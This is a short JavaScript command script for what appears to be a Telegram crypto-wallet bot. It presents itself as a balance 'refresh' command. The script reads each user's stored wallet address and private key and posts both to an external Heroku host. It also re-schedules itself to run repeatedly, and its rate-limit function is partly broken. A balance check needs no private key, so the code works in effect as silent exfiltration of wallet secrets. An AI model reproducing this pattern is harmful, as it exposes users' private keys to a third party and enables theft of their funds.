/*CMD
  command: refh
  help: 
  need_reply: false
  auto_retry_time: 120
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: /refresh, refresh, refresh, actualizar 🔄, refresh 🔄
CMD*/

Bot.run({
    command: "refh",
    run_after: 60 * 10,
  })

function canRun(){
  var last_run_at = User.getProperty("last_run_at");
  if(!last_run_at){ return true }
  
  var minutes = (Date.now() - last_run_at) /1000/60;
  
 var minutes_in_day =  1 * 1
          var next = minutes_in_day - minutes
          var wait_hours = Math.floor(next / 60)
          next -= wait_hours * 60
          var wait_minutes = Math.floor(next)
          var seconds = Math.floor((next - wait_minutes) * 60)
          if (minutes < minutes_in_day) {
   Bot.sendMessage("");
   return
 }
  return true;
 }

if(!canRun()){ return }
User.setProperty("last_run_at", Date.now(), "integer");
var cbal = User.getProperty("cbal")
var rs = Libs.ResourcesLib.userRes("temp");
var wallpk = User.getProperty("wallpk")
var w = User.getProperty("wallset")
HTTP.post( {
    url: "https://tronb.herokuapp.com/balance",
    success: 'rry',
    body: {'address':w,'private_key': wallpk}

})
Bot.run({
    command: "refh",
    run_after: 60 * 4,
  })
